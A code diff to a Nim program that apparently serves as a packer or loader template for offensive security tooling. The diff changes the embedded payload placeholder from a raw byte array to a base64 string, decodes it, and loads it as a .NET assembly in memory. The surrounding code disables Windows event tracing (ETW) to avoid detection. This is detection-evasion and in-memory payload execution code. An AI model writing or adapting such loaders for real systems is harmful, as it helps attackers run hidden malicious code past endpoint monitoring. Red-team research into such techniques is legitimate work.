@@ -22,6 +22,7 @@ import strformat
 import os
 import dynlib
 import strenc
+import base64
 
 # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: let verbose = false
 #[ PLACEHOLDERVERBOSE ]#
@@ -90,8 +91,14 @@ when isMainModule:
         if verbose:
             echo fmt"[*] ETW disabled: {bool(success)}"
 
-    # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: let buf: array[8, byte] = [byte 0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00]
-    #[ PLACEHOLDERBYTEARRAY ]#
+    # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: let b64buf = "TVqQAAMAAAAEAA=="
+    #[ PLACEHOLDERBENCBIN ]#
+
+    ## Converts a string to the corresponding byte sequence.
+    func toByteSeq*(str: string): seq[byte] {.inline.} =
+        @(str.toOpenArrayByte(0, str.high))
+
+    var buf = toByteSeq(decode(b64buf))
 
     var assembly = load(buf)
 
